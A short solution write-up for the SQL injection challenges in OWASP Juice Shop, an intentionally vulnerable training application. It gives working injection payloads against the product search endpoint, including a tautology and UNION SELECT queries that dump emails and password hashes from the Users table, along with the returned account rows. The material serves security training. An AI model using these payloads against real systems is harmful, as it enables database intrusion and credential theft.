# Sql Injection Solutions

Use this to validate that all products can be returned, including deleted products.
```
GET /rest/products/search?q=dud'))OR+1+=+1--
```

Verifies a UNION clause can be used to exfiltrate data.
```
GET /rest/products/search?q=dud'))+UNION--
```

Note that the responses from Juice Shop have nine values.

``` json
{
  "status": "success",
  "data": [
    {
      "id": 9,
      "name": "OWASP SSL Advanced Forensic Tool (O-Saft)",
      "description": "O-Saft is an easy to use tool to show information about SSL certificate and tests the SSL connection according given list of ciphers and various SSL configurations. <a href=\"https://www.owasp.org/index.php/O-Saft\" target=\"_blank\">More...</a>",
      "price": 0.01,
      "deluxePrice": 0.01,
      "image": "orange_juice.jpg",
      "createdAt": "2024-03-21 00:39:44.404 +00:00",
      "updatedAt": "2024-03-21 00:39:44.404 +00:00",
      "deletedAt": null
    }
  ]
}
```

Union the request with the Users table and columns likely to exist in a Users table.

```
GET /rest/products/search?q=test'))%20UNION%20SELECT%20id,email,password,username,'5','6','7','8','9'%20FROM%20Users--
```

This returns user accounts.

``` json
{
  "status": "success",
  "data": [
    {
      "id": 1,
      "name": "admin@juice-sh.op",
      "description": "0192023a7bbd73250516f069df18b500",
      "price": "4",
      "deluxePrice": "5",
      "image": "6",
      "createdAt": "7",
      "updatedAt": "8",
      "deletedAt": "9"
    },
    {
      "id": 2,
      "name": "jim@juice-sh.op",
      "description": "e541ca7ecf72b8d1286474fc613e5e45",
      "price": "4",
      "deluxePrice": "5",
      "image": "6",
      "createdAt": "7",
      "updatedAt": "8",
      "deletedAt": "9"
    },
    {
      "id": 3,
      "name": "bender@juice-sh.op",
      "description": "0c36e517e3fa95aabf1bbffc6744a4ef",
      "price": "4",
      "deluxePrice": "5",
      "image": "6",
      "createdAt": "7",
      "updatedAt": "8",
      "deletedAt": "9"
    },
    {
      "id": 4,
      "name": "bjoern.kimminich@gmail.com",
      "description": "6edd9d726cbdc873c539e41ae8757b8c",
      "price": "4",
      "deluxePrice": "5",
      "image": "6",
      "createdAt": "7",
      "updatedAt": "8",
      "deletedAt": "9"
    }
  ]
}
```
Guessing other columns yields success.

```
GET /rest/products/search?q=juice'))%20UNION%20SELECT%20id,email,password,username,createdAt,updatedAt,isActive,role,'9'%20FROM%20Users--
```